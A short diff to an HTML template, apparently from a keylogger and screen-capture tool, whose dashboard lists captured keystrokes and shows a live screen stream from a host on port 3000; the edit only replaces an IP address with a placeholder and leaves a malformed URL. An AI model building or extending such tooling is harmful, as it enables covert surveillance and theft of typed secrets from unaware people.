@@ -33,7 +33,7 @@ HTML_TEMPLATE = """
     <h1>{{myip}}</h1>
     <div id="keystrokes">{{ keystrokes }}</div>
     <h1>Live Screen Streaming</h1>
-    <img src="http://10.205.50.122:3000/video_feed" width="800">
+    <img src="HTTP:<IP_ADDRESS>:3000/video_feed" width="800">
     <script>
         const fetchKeystrokes = async () => {
             const response = await fetch('/get_keystrokes');
